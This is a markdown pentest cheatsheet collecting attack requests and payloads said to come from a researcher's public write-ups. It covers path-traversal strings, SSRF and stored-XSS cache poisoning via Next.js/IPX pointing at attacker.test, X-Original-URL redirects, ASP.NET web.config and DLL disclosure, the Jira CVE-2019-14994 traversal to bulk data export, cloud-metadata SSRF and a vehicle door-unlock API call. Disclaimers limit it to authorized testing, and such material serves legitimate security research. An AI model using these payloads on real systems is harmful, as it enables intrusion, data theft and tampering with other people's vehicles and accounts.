# Pentest Cheatsheet (from Sam Curry’s public write‑ups)
**For authorized testing only.** Replace any real domains/tokens with your test environment. Use ethically and legally.

> This cheatsheet aggregates commands, payload patterns, and investigation steps Sam Curry used across several public write‑ups. It’s organized by topic with genericized examples.

---

## Quick Toolbelt
- **HTTP test server**  
  ```bash
  python3 -m http.server 8000
  # then test from another host:
  curl "http://<server-ip>:8000/test"
  ```

- **Tail live logs (nginx example)**  
  ```bash
  sudo service nginx start
  tail -f /var/log/nginx/access.log
  ```

- **Recon utilities**  
  ```bash
  # subdomains
  sublist3r -d target.com -o subs.txt

  # collect historical URLs
  gau --subs target.com | sort -u > urls.txt

  # directory/content brute force
  ffuf -w /path/wordlist.txt -u https://target.com/FUZZ -mc all -fs 0

  # path brute force (alt)

  dirsearch -u https://target.com -e php,asp,aspx,js,json -w /path/wordlist.txt
  ```

---

## Detecting Reverse‑Proxied API Paths & Mapping Backends (Cox “CBMA” pattern)
### Signals
- Distinct behavior for special API prefix (e.g., `/api/cbma/`): requests **with** the prefix hit a reverse proxy/backend; other paths may 301/302 to a UI.

### Probes
```http
# Different behavior when *not* using the special prefix
GET /api/anything_else/example HTTP/1.1
Host: myaccount-business.example.com

# Expected: 301/302 → /cbma/api/...

# Using the reverse‑proxied prefix (often 500 when route not present)
GET /api/cbma/example HTTP/1.1
Host: myaccount-business.example.com
```

### Registration / “who am I” style call (redacted headers)
```http
POST /api/cbma/userauthorization/services/profile/validate/v1/email HTTP/1.1
Host: myaccount-business.example.com
Content-Type: application/json
Clientid: <client-id>
Apikey: <shared-api-key-or-public-key>
Cb_session: unauthenticateduser

{"email":"test@example.com"}
```
Use responses to fingerprint roles/tenants and enumerate downstream routes via beautified JS bundles (e.g., `main.*.js`).

---

## Vehicle Telematics / Dealer “APIGW” Pattern (Kia example)
### Website forwards → backend API
```http
# Web front-end proxy
POST /apps/services/owners/apigwServlet.html HTTP/2
Host: owners.example.com
Httpmethod: GET
Apiurl: /door/unlock
Servicetype: postLoginCustomer
Cookie: JSESSIONID=<session>
```

### Server‑formed request to backend
```http
GET /apigw/v1/rems/door/unlock HTTP/1.1
Host: api.owners.example.com
Sid: <session-id>
Vinkey: <uuid-linked-to-vin>
```

### Dealer portal variant (same servlet shape)
```http
POST /apps/services/kdealer/apigwServlet.html HTTP/1.1
Host: kiaconnect.kdealer.example.com
Httpmethod: POST
Apiurl: /prof/registerUser

{"userCredential":{"firstName":"Test","lastName":"User","userId":"me@example.com","password":"<pwd>","acceptedTerms":1}}
```

> **Note:** In testing, look for `Sid`, `Appid`, VIN/VIN‑key semantics. Always test on your own vehicles/dev env only.

---

## Airline/Rewards Platforms Integrated with a Core Provider
### OAuth handoff & tenant token (“memberValidation”‑style)
```http
# SSO exchange from airline → provider
POST /mileage-plus/sessions/sso HTTP/2
Host: buymiles.example.com
Content-Type: application/json

{"mvUrl":"<airline_sso_token>"}

# Response returns a provider token used across endpoints:
# {"memberValidation":"<provider_user_token>"}
```

### “Add recipient” / profile lookup anti‑pattern
```http
POST /mileage-plus/mvs/recipient HTTP/2
Host: buymiles.example.com
Content-Type: application/json

{"mvPayload":{"identifyingFactors":{"firstName":"Alice","lastName":"Smith","memberId":"EH123456"}},"lpId":"<loyalty_program_uuid>"}
```
- If response embeds an auth link/token, ensure it’s only visible to the caller and **never** reflects another user’s token.  
- Try swapping tenant UUIDs in **your own** account workflow to detect cross‑tenant leakage (no unauthorized testing).

---

## Next.js / Netlify IPX Image Pipeline
### Open Redirect via `/_next/image` (path parsing)
```http
GET /_next/image?url=//example.com/&q=100&w=128&h=128
Host: victim.example
# Observe redirect behavior for malformed local path
```

### Bypass host allowlist & SSRF/XSS via `/_ipx/` (ufo parsing quirk)
```http
GET /_ipx/w_200/https:%2f%2fexample.com%5c@attacker.test%2fattack.svg
Host: victim.example
# If victim explicitly whitelisted example.com, this may fetch from attacker.test
```

### Universal stored XSS via `X-Forwarded-Proto` cache trick
```http
# Seed the cache with an attacker SVG (server treats header content as full URL)
GET /_ipx/poc.svg HTTP/1.1
Host: victim.example
X-Forwarded-Proto: http://attacker.test/malicious.svg?

# Later loads of /_ipx/poc.svg return cached malicious SVG
```

---

## “BFF” (Backend‑for‑Frontend) Proxies & Internal Graph APIs (Starbucks pattern)
### Tell‑tale BFF path
```http
POST /bff/proxy/orchestra/get-user HTTP/1.1
Host: app.example.com
```

### Traversal payloads to reach internal roots (mix encodings / slashes)
Try variations when the last path segment is user‑controlled:
```
..%2f
..;/
../
..%5c
..\ 
.%2e/
web\..\.\..\.\..\.\..\.\..```
Once at root, enumerate internal routes (watch 301/302 redirect hints).

### OData enumeration examples (generic)
```http
GET /bff/proxy/.../Search/v1/Accounts?$count=true
GET /bff/proxy/.../Search/v1/Accounts?$filter=startswith(UserName,'alice')
```

---

## HTTP Cache Poisoning + Header Confusion (Rocket League pattern)
### Detect CDN caching
Look for `Age`, `X-Cache: HIT`, `Via: varnish` headers.

### Rewrite mapping with `X-Original-URL`
```http
GET /?k=1 HTTP/1.1
Host: www.victim.example
X-Original-URL: /does-not-exist
```

### Coerce external redirect with backslash + double‑slash trick
```http
GET /?pleaseWork=1 HTTP/1.1
Host: www.victim.example
X-Original-URL: https:\attacker.test/please//work
# Response Location: https:\attacker.test/please/work
```

---

## ASP.NET Local File Disclosure (LFD) & Secrets
### Direct file read
```http
GET /utility/download.aspx?f=download.aspx
```

### Bypass traversal block with `.+./` join
```http
GET /utility/download.aspx?f=.+./.+./web.config
GET /utility/download.aspx?f=.+./.+./bin/Example.dll
```

### Decompile & enumerate
- Pull DLLs from `/bin/*.dll`, inspect with **dnSpy**.
- Typical sensitive file: `web.config` (keys, connection strings).

### Azure Key Vault (client credentials) — *generic* Node snippet
```js
const KeyVault = require('azure-keyvault');
const { AuthenticationContext } = require('adal-node');

const clientId = process.env.AZURE_CLIENT_ID;
const clientSecret = process.env.AZURE_CLIENT_SECRET;
const vaultUri = process.env.AZURE_VAULT_URI;

const authenticator = (challenge, cb) => {
  const ctx = new AuthenticationContext(challenge.authorization);
  ctx.acquireTokenWithClientCredentials(
    challenge.resource, clientId, clientSecret,
    (err, token) => {
      if (err) throw err;
      cb(null, `${token.tokenType} ${token.accessToken}`);
    }
  );
};

const credentials = new KeyVault.KeyVaultCredentials(authenticator);
const client = new KeyVault.KeyVaultClient(credentials);
client.getSecrets(vaultUri).then(console.log);
```

---

## Jira Service Desk Path Traversal → Bulk Data Export (CVE‑2019‑14994)
### Confirm Service Desk & register (if allowed)
- Visit `/servicedesk/` → login/registration page.
- If self‑signup exists, create a *customer* account in a test environment.

### Traversal from customer → admin paths
```http
GET /servicedesk/customer/../../secure/BrowseProjects.jspa HTTP/1.1
Host: target.example

# Alt normalization (IIS/tomcat quirks)
GET /servicedesk/customer/..;/..;/secure/BrowseProjects.jspa HTTP/1.1
```

### Bulk export endpoints (example)
```http
GET /servicedesk/customer/../../sr/jira.issueviews:searchrequest-html-all-fields/temp/SearchRequest.html?jqlQuery=text+%7E+%22%22
# or XML form:
GET /servicedesk/customer/../../sr/jira.issueviews:searchrequest-xml/temp/SearchRequest.xml?jqlQuery=text+%7E+%22%22
```

---

## SSRF via “Screenshot/Fetcher” + XSS (Yahoo acquisition pattern)
### Idea
1) Find server‑side screenshot/previewer that fetches a URL.
2) Get *server* to render an **iframe/script** (via XSS / HTML injection in builder).
3) Point it at internal/metadata hosts (e.g., `http://169.254.169.254/`) *in your lab* to validate SSRF.

### Example injection (builder updates content to HTML)
```http
POST /update_element_content
...
prop_name=TEXT&prop_value=<iframe src="https://example-internal/"></iframe>&...
```

---

## SSO / Admin Enumeration (Auto industry patterns)
### WADL self‑documentation
```http
GET /rest/api/application.wadl HTTP/1.1
Host: target.example
```

### TOTP abuse endpoint shape (example)
```http
GET /rest/api/chains/accounts/<user-id>/totp HTTP/1.1
Host: target.example
```

> **Hunting tip:** Reverse engineer large JS bundles on dealer/employee portals to extract API bases and constants, then probe for weak SSO controls and mass assignment.

---

## Handy Payload Fragments (genericized)
- Directory traversal variants: `../`, `..%2f`, `..;/`, `..%c0%af`, `..%5c`, `..\`  
- Path‑join quirks: `.+./`, mixed slash+backslash on Windows/IIS.  
- Open redirect probes: `//attacker.test/`, `https:\attacker.test\`, `/?next=//attacker.test/`  
- Cache poisoning headers: `X-Original-URL`, `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Forwarded-Port`  
- SSRF URL confusions: username@host, backslash host splits, nested schemes, URL‑encoded separators.

---

### Legal & Safety
Only test targets you **own** or have **explicit written permission** to assess. Many examples above were fixed long ago; treat them as patterns for **defensive validation** in your own environments.

